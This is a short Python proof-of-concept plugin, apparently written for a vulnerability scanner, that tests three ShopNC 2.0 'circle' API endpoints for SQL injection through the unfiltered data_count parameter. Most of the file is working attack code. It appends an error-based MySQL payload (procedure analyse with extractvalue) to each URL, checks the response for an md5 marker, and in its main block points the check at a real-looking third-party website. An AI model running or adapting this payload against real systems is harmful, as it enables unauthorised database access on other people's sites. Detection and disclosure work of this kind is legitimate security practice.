#!/usr/bin/env python
# -*- coding: utf-8 -*-



#Author:wonderkun
#Name:shopnc  020版三处sql注入打包 
#Refer:http://www.wooyun.org/bugs/wooyun-2015-0125512
#Data:2015/12/19

'''
三处注入，注入的原理一样
都是 data_count参数没有过滤 

第一处：
/circle/index.php?act=api&op=get_theme_list&data_count=1
第二处：
/circle/index.php??act=api&op=get_reply_themelist&data_count=1
第三处：
/circle/index.php?act=api&op=get_more_membertheme&data_count=1

'''

def assign(service,arg):
    if service=="shopnc":
        return True,arg 
 
def audit(arg):
    urls=[
    'circle/index.php?act=api&op=get_theme_list&data_count=1',
    'circle/index.php?act=api&op=get_reply_themelist&data_count=1',
    'circle/index.php?act=api&op=get_more_membertheme&data_count=1'
    ]
    payload="%20procedure%20analyse(extractvalue(rand(),concat(0x3a,md5(1))),1)"
    for url in urls: 
        vun_url=arg+url+payload
        code,head,res,errcode,finalurl=curl.curl2(vun_url)
        if  code==200 and  "c4ca4238a0b923820dcc509a6f75849" in res:
            security_hole('sql inject'+vun_url)

if __name__=='__main__':
    from dummy import *
    audit(assign('shopnc','http://o.yugongw.com/')[1])